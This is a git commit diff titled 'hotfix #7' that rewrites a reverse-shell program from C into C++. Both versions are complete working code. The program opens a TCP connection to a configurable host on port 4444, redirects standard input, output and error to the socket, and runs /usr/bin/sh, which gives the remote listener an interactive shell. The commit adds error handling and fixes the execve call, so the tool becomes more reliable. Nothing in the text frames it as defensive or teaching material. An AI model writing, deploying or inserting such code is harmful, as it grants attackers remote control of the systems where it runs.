487a75fdac6af8f1b136f2c8aff864b91939070c
Ch4r0nN λ <82242552+Ch4r0nN@users.noreply.github.com>
2024-06-07 13:43:14 -0300

    hotfix #7

--- src/reverse-shell.cpp
+++ src/reverse-shell.cpp
@@ -1,5 +1,6 @@
-#include <stdio.h>
-#include <stdlib.h>
+#include <iostream>
+#include <cstdlib>
+#include <cstring>
 #include <netdb.h>
 #include <unistd.h>
 #include <arpa/inet.h>
@@ -8,29 +9,33 @@
 
 #define HOST_ADDR "127.0.0.1"
 
-int main(void) {
-
+int main() {
     int sock_u;
     int connc_server;
     struct sockaddr_in r_server;
 
     sock_u = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock_u < 0) {
+        std::cerr << "Error creating socket" << std::endl;
+        return EXIT_FAILURE;
+    }
 
     r_server.sin_family = AF_INET;
     r_server.sin_port = htons(4444);
     r_server.sin_addr.s_addr = inet_addr(HOST_ADDR);
+    memset(&(r_server.sin_zero), '\0', 8);  // Zero the rest of the struct
 
-
-    connc_server = connect(sock_u, (struct sockaddr * )&r_server, sizeof r_server);
-
+    connc_server = connect(sock_u, (struct sockaddr *)&r_server, sizeof(r_server));
     if (connc_server == 0) {
         dup2(sock_u, 0);
         dup2(sock_u, 1);
         dup2(sock_u, 2);
-        execve("/usr/bin/sh", NULL);
+        char *const args[] = {"/usr/bin/sh", nullptr};
+        execve(args[0], args, nullptr);
     } else {
-        printf("\n\n\tError");
+        std::cerr << "\n\n\tError" << std::endl;
         close(sock_u);
-        close(connc_server);
     }
+
+    return 0;
 }
